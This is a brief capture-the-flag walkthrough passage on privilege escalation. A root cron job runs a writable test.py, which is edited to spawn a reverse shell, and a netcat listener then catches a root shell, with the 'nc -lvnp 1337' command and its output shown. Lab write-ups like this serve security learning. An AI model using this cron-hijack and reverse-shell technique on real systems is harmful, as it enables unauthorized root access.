* So we have a shell as the scriptmanager user, and we see that there is a scripts directory in /, lets look at that
* There are two files, test.py and test.txt
* Root is running test.py every minute as a cron and we can edit test.py
* Change code in test.py to spawn a reverse shell when its executed
```bash
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.68] 45722
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
